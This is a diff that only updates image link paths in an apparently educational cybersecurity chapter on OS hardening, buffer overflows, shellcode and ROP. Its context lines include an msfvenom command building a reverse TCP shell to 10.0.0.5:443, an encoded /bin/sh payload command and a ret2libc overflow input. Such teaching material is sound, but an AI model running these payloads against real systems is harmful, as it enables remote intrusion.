@@ -70,14 +70,14 @@ flowchart TB
 
 ### 1.1 OS Hardening Philosophy
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-1-os-hardening-philosophy-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-1-os-hardening-philosophy-handwritten.svg" alt="Handwritten: 1.1 OS Hardening Philosophy" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-1-os-hardening-philosophy-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-1-os-hardening-philosophy-handwritten.svg" alt="Handwritten: 1.1 OS Hardening Philosophy" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-1-os-hardening-philosophy-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-1-os-hardening-philosophy-diagram.svg" alt="Diagram: 1.1 OS Hardening Philosophy" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-1-os-hardening-philosophy-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-1-os-hardening-philosophy-diagram.svg" alt="Diagram: 1.1 OS Hardening Philosophy" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-1-os-hardening-philosophy-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-1-os-hardening-philosophy-sticky.svg" alt="Sticky Note: 1.1 OS Hardening Philosophy" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-1-os-hardening-philosophy-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-1-os-hardening-philosophy-sticky.svg" alt="Sticky Note: 1.1 OS Hardening Philosophy" width="30%">
 </a>
 
 
@@ -93,14 +93,14 @@ flowchart TB
 
 ### 1.2 Linux Hardening
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-2-linux-hardening-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-2-linux-hardening-handwritten.svg" alt="Handwritten: 1.2 Linux Hardening" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-2-linux-hardening-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-2-linux-hardening-handwritten.svg" alt="Handwritten: 1.2 Linux Hardening" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-2-linux-hardening-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-2-linux-hardening-diagram.svg" alt="Diagram: 1.2 Linux Hardening" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-2-linux-hardening-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-2-linux-hardening-diagram.svg" alt="Diagram: 1.2 Linux Hardening" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-2-linux-hardening-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-2-linux-hardening-sticky.svg" alt="Sticky Note: 1.2 Linux Hardening" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-2-linux-hardening-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-2-linux-hardening-sticky.svg" alt="Sticky Note: 1.2 Linux Hardening" width="30%">
 </a>
 
 
@@ -247,14 +247,14 @@ cat /var/log/lynis-report.dat | grep "suggestion"
 
 ### 1.3 Windows Hardening
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-3-windows-hardening-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-3-windows-hardening-handwritten.svg" alt="Handwritten: 1.3 Windows Hardening" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-3-windows-hardening-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-3-windows-hardening-handwritten.svg" alt="Handwritten: 1.3 Windows Hardening" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-3-windows-hardening-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-3-windows-hardening-diagram.svg" alt="Diagram: 1.3 Windows Hardening" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-3-windows-hardening-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-3-windows-hardening-diagram.svg" alt="Diagram: 1.3 Windows Hardening" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-3-windows-hardening-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-3-windows-hardening-sticky.svg" alt="Sticky Note: 1.3 Windows Hardening" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-3-windows-hardening-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-3-windows-hardening-sticky.svg" alt="Sticky Note: 1.3 Windows Hardening" width="30%">
 </a>
 
 
@@ -354,14 +354,14 @@ Shows every autostart location:
 
 ### 1.4 OS Hardening Checklist
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-4-os-hardening-checklist-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-4-os-hardening-checklist-handwritten.svg" alt="Handwritten: 1.4 OS Hardening Checklist" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-4-os-hardening-checklist-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-4-os-hardening-checklist-handwritten.svg" alt="Handwritten: 1.4 OS Hardening Checklist" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-4-os-hardening-checklist-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-4-os-hardening-checklist-diagram.svg" alt="Diagram: 1.4 OS Hardening Checklist" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-4-os-hardening-checklist-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-4-os-hardening-checklist-diagram.svg" alt="Diagram: 1.4 OS Hardening Checklist" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-4-os-hardening-checklist-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-4-os-hardening-checklist-sticky.svg" alt="Sticky Note: 1.4 OS Hardening Checklist" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-4-os-hardening-checklist-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-4-os-hardening-checklist-sticky.svg" alt="Sticky Note: 1.4 OS Hardening Checklist" width="30%">
 </a>
 
 
@@ -386,14 +386,14 @@ Shows every autostart location:
 
 ### 2.1 Memory Layout of a Process
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-1-memory-layout-of-a-process-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-1-memory-layout-of-a-process-handwritten.svg" alt="Handwritten: 2.1 Memory Layout of a Process" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-1-memory-layout-of-a-process-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-1-memory-layout-of-a-process-handwritten.svg" alt="Handwritten: 2.1 Memory Layout of a Process" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-1-memory-layout-of-a-process-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-1-memory-layout-of-a-process-diagram.svg" alt="Diagram: 2.1 Memory Layout of a Process" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-1-memory-layout-of-a-process-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-1-memory-layout-of-a-process-diagram.svg" alt="Diagram: 2.1 Memory Layout of a Process" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-1-memory-layout-of-a-process-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-1-memory-layout-of-a-process-sticky.svg" alt="Sticky Note: 2.1 Memory Layout of a Process" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-1-memory-layout-of-a-process-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-1-memory-layout-of-a-process-sticky.svg" alt="Sticky Note: 2.1 Memory Layout of a Process" width="30%">
 </a>
 
 
@@ -427,14 +427,14 @@ Low Address
 
 ### 2.2 Stack Buffer Overflow
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-2-stack-buffer-overflow-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-2-stack-buffer-overflow-handwritten.svg" alt="Handwritten: 2.2 Stack Buffer Overflow" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-2-stack-buffer-overflow-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-2-stack-buffer-overflow-handwritten.svg" alt="Handwritten: 2.2 Stack Buffer Overflow" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-2-stack-buffer-overflow-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-2-stack-buffer-overflow-diagram.svg" alt="Diagram: 2.2 Stack Buffer Overflow" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-2-stack-buffer-overflow-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-2-stack-buffer-overflow-diagram.svg" alt="Diagram: 2.2 Stack Buffer Overflow" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-2-stack-buffer-overflow-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-2-stack-buffer-overflow-sticky.svg" alt="Sticky Note: 2.2 Stack Buffer Overflow" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-2-stack-buffer-overflow-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-2-stack-buffer-overflow-sticky.svg" alt="Sticky Note: 2.2 Stack Buffer Overflow" width="30%">
 </a>
 
 
@@ -600,14 +600,14 @@ YOU WIN! Secret function executed.
 
 ### 2.3 Heap Buffer Overflow
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-3-heap-buffer-overflow-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-3-heap-buffer-overflow-handwritten.svg" alt="Handwritten: 2.3 Heap Buffer Overflow" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-3-heap-buffer-overflow-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-3-heap-buffer-overflow-handwritten.svg" alt="Handwritten: 2.3 Heap Buffer Overflow" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-3-heap-buffer-overflow-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-3-heap-buffer-overflow-diagram.svg" alt="Diagram: 2.3 Heap Buffer Overflow" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-3-heap-buffer-overflow-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-3-heap-buffer-overflow-diagram.svg" alt="Diagram: 2.3 Heap Buffer Overflow" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-3-heap-buffer-overflow-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-3-heap-buffer-overflow-sticky.svg" alt="Sticky Note: 2.3 Heap Buffer Overflow" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-3-heap-buffer-overflow-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-3-heap-buffer-overflow-sticky.svg" alt="Sticky Note: 2.3 Heap Buffer Overflow" width="30%">
 </a>
 
 
@@ -695,14 +695,14 @@ printf("%s\n", ptr);    // USE AFTER FREE → dangling pointer
 
 ### 2.4 SEH Overflow (Windows)
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-4-seh-overflow-windows-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-4-seh-overflow-windows-handwritten.svg" alt="Handwritten: 2.4 SEH Overflow (Windows)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-4-seh-overflow-windows-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-4-seh-overflow-windows-handwritten.svg" alt="Handwritten: 2.4 SEH Overflow (Windows)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-4-seh-overflow-windows-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-4-seh-overflow-windows-diagram.svg" alt="Diagram: 2.4 SEH Overflow (Windows)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-4-seh-overflow-windows-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-4-seh-overflow-windows-diagram.svg" alt="Diagram: 2.4 SEH Overflow (Windows)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-4-seh-overflow-windows-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-4-seh-overflow-windows-sticky.svg" alt="Sticky Note: 2.4 SEH Overflow (Windows)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-4-seh-overflow-windows-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-4-seh-overflow-windows-sticky.svg" alt="Sticky Note: 2.4 SEH Overflow (Windows)" width="30%">
 </a>
 
 
@@ -732,14 +732,14 @@ Modern mitigations: SafeSEH (validates handler address), SEHOP (validates chain 
 
 ### 2.5 Buffer Overflow Defenses Comparison
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-5-buffer-overflow-defenses-comparison-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-5-buffer-overflow-defenses-comparison-handwritten.svg" alt="Handwritten: 2.5 Buffer Overflow Defenses Comparison" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-5-buffer-overflow-defenses-comparison-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-5-buffer-overflow-defenses-comparison-handwritten.svg" alt="Handwritten: 2.5 Buffer Overflow Defenses Comparison" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-5-buffer-overflow-defenses-comparison-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-5-buffer-overflow-defenses-comparison-diagram.svg" alt="Diagram: 2.5 Buffer Overflow Defenses Comparison" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-5-buffer-overflow-defenses-comparison-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-5-buffer-overflow-defenses-comparison-diagram.svg" alt="Diagram: 2.5 Buffer Overflow Defenses Comparison" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-5-buffer-overflow-defenses-comparison-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-5-buffer-overflow-defenses-comparison-sticky.svg" alt="Sticky Note: 2.5 Buffer Overflow Defenses Comparison" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-5-buffer-overflow-defenses-comparison-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-5-buffer-overflow-defenses-comparison-sticky.svg" alt="Sticky Note: 2.5 Buffer Overflow Defenses Comparison" width="30%">
 </a>
 
 
@@ -760,14 +760,14 @@ Modern mitigations: SafeSEH (validates handler address), SEHOP (validates chain 
 
 ### 3.1 What Is Shellcode?
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/3-1-what-is-shellcode-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/3-1-what-is-shellcode-handwritten.svg" alt="Handwritten: 3.1 What Is Shellcode?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/3-1-what-is-shellcode-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/3-1-what-is-shellcode-handwritten.svg" alt="Handwritten: 3.1 What Is Shellcode?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/3-1-what-is-shellcode-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/3-1-what-is-shellcode-diagram.svg" alt="Diagram: 3.1 What Is Shellcode?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/3-1-what-is-shellcode-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/3-1-what-is-shellcode-diagram.svg" alt="Diagram: 3.1 What Is Shellcode?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/3-1-what-is-shellcode-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/3-1-what-is-shellcode-sticky.svg" alt="Sticky Note: 3.1 What Is Shellcode?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/3-1-what-is-shellcode-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/3-1-what-is-shellcode-sticky.svg" alt="Sticky Note: 3.1 What Is Shellcode?" width="30%">
 </a>
 
 
@@ -783,14 +783,14 @@ Shellcode is position-independent machine code that executes the attacker's inte
 
 ### 3.2 Writing Shellcode in Assembly (Linux x86)
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/3-2-writing-shellcode-in-assembly-linux-x86-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/3-2-writing-shellcode-in-assembly-linux-x86-handwritten.svg" alt="Handwritten: 3.2 Writing Shellcode in Assembly (Linux x86)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/3-2-writing-shellcode-in-assembly-linux-x86-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/3-2-writing-shellcode-in-assembly-linux-x86-handwritten.svg" alt="Handwritten: 3.2 Writing Shellcode in Assembly (Linux x86)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/3-2-writing-shellcode-in-assembly-linux-x86-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/3-2-writing-shellcode-in-assembly-linux-x86-diagram.svg" alt="Diagram: 3.2 Writing Shellcode in Assembly (Linux x86)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/3-2-writing-shellcode-in-assembly-linux-x86-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/3-2-writing-shellcode-in-assembly-linux-x86-diagram.svg" alt="Diagram: 3.2 Writing Shellcode in Assembly (Linux x86)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/3-2-writing-shellcode-in-assembly-linux-x86-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/3-2-writing-shellcode-in-assembly-linux-x86-sticky.svg" alt="Sticky Note: 3.2 Writing Shellcode in Assembly (Linux x86)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/3-2-writing-shellcode-in-assembly-linux-x86-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/3-2-writing-shellcode-in-assembly-linux-x86-sticky.svg" alt="Sticky Note: 3.2 Writing Shellcode in Assembly (Linux x86)" width="30%">
 </a>
 
 
@@ -862,14 +862,14 @@ $                         # Shell spawned → exit with Ctrl+D
 
 ### 3.3 Practical: msfvenom Shellcode Generation
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/3-3-practical-msfvenom-shellcode-generation-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/3-3-practical-msfvenom-shellcode-generation-handwritten.svg" alt="Handwritten: 3.3 Practical: msfvenom Shellcode Generation" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/3-3-practical-msfvenom-shellcode-generation-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/3-3-practical-msfvenom-shellcode-generation-handwritten.svg" alt="Handwritten: 3.3 Practical: msfvenom Shellcode Generation" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/3-3-practical-msfvenom-shellcode-generation-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/3-3-practical-msfvenom-shellcode-generation-diagram.svg" alt="Diagram: 3.3 Practical: msfvenom Shellcode Generation" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/3-3-practical-msfvenom-shellcode-generation-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/3-3-practical-msfvenom-shellcode-generation-diagram.svg" alt="Diagram: 3.3 Practical: msfvenom Shellcode Generation" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/3-3-practical-msfvenom-shellcode-generation-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/3-3-practical-msfvenom-shellcode-generation-sticky.svg" alt="Sticky Note: 3.3 Practical: msfvenom Shellcode Generation" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/3-3-practical-msfvenom-shellcode-generation-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/3-3-practical-msfvenom-shellcode-generation-sticky.svg" alt="Sticky Note: 3.3 Practical: msfvenom Shellcode Generation" width="30%">
 </a>
 
 
@@ -904,14 +904,14 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 \
 
 ### 3.4 Shellcode Encoding and Obfuscation
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/3-4-shellcode-encoding-and-obfuscation-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/3-4-shellcode-encoding-and-obfuscation-handwritten.svg" alt="Handwritten: 3.4 Shellcode Encoding and Obfuscation" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/3-4-shellcode-encoding-and-obfuscation-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/3-4-shellcode-encoding-and-obfuscation-handwritten.svg" alt="Handwritten: 3.4 Shellcode Encoding and Obfuscation" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/3-4-shellcode-encoding-and-obfuscation-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/3-4-shellcode-encoding-and-obfuscation-diagram.svg" alt="Diagram: 3.4 Shellcode Encoding and Obfuscation" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/3-4-shellcode-encoding-and-obfuscation-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/3-4-shellcode-encoding-and-obfuscation-diagram.svg" alt="Diagram: 3.4 Shellcode Encoding and Obfuscation" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/3-4-shellcode-encoding-and-obfuscation-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/3-4-shellcode-encoding-and-obfuscation-sticky.svg" alt="Sticky Note: 3.4 Shellcode Encoding and Obfuscation" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/3-4-shellcode-encoding-and-obfuscation-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/3-4-shellcode-encoding-and-obfuscation-sticky.svg" alt="Sticky Note: 3.4 Shellcode Encoding and Obfuscation" width="30%">
 </a>
 
 
@@ -936,14 +936,14 @@ msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/alpha_mixed -f c
 
 ### 4.1 Return-to-libc (ret2libc)
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/4-1-return-to-libc-ret2libc-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/4-1-return-to-libc-ret2libc-handwritten.svg" alt="Handwritten: 4.1 Return-to-libc (ret2libc)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/4-1-return-to-libc-ret2libc-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/4-1-return-to-libc-ret2libc-handwritten.svg" alt="Handwritten: 4.1 Return-to-libc (ret2libc)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/4-1-return-to-libc-ret2libc-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/4-1-return-to-libc-ret2libc-diagram.svg" alt="Diagram: 4.1 Return-to-libc (ret2libc)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/4-1-return-to-libc-ret2libc-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/4-1-return-to-libc-ret2libc-diagram.svg" alt="Diagram: 4.1 Return-to-libc (ret2libc)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/4-1-return-to-libc-ret2libc-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/4-1-return-to-libc-ret2libc-sticky.svg" alt="Sticky Note: 4.1 Return-to-libc (ret2libc)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/4-1-return-to-libc-ret2libc-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/4-1-return-to-libc-ret2libc-sticky.svg" alt="Sticky Note: 4.1 Return-to-libc (ret2libc)" width="30%">
 </a>
 
 
@@ -995,14 +995,14 @@ $ ./vuln $(python2 -c 'print "A"*76 + "\x00\xd2\x03\xf7" + "FAKE" + "\xf3\xe0\x1
 
 ### 4.2 Return-Oriented Programming (ROP)
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/4-2-return-oriented-programming-rop-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/4-2-return-oriented-programming-rop-handwritten.svg" alt="Handwritten: 4.2 Return-Oriented Programming (ROP)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/4-2-return-oriented-programming-rop-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/4-2-return-oriented-programming-rop-handwritten.svg" alt="Handwritten: 4.2 Return-Oriented Programming (ROP)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/4-2-return-oriented-programming-rop-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/4-2-return-oriented-programming-rop-diagram.svg" alt="Diagram: 4.2 Return-Oriented Programming (ROP)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/4-2-return-oriented-programming-rop-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/4-2-return-oriented-programming-rop-diagram.svg" alt="Diagram: 4.2 Return-Oriented Programming (ROP)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/4-2-return-oriented-programming-rop-sticky.svg" target="_blank" rel="noopener">
